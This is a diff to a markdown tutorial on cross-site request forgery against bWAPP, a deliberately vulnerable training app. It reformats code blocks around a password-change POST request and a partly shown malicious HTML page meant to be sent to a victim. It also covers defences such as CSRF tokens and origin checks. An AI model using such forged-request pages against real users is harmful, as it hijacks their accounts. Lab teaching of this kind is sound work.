@@ -28,13 +28,14 @@ Navigate to: `http://localhost/bWAPP/csrf_1.php`
 The form sends a POST request like:
 
 ```http
+
 POST /bWAPP/csrf_1.php
 password_new=test123&password_conf=test123&form=submit
 
+```
 ### 3. Create Malicious CSRF Page
 
-
-
+```
 <!DOCTYPE html>
 <html>
   <body>
@@ -49,8 +50,7 @@ password_new=test123&password_conf=test123&form=submit
     </script>
   </body>
 </html>
-
----
+```
 
 Host this file and send it to the victim. Once they open it while logged in, their password gets changed silently.
 
@@ -72,9 +72,10 @@ Referer or Origin Checks: Validate that requests originate from the same domain.
 Example using token:
 
 html code
-
-
+```
 <input type="hidden" name="csrf_token" value="abc123">
+
+```
 Server must verify this token before processing.
 
 ✅ Summary
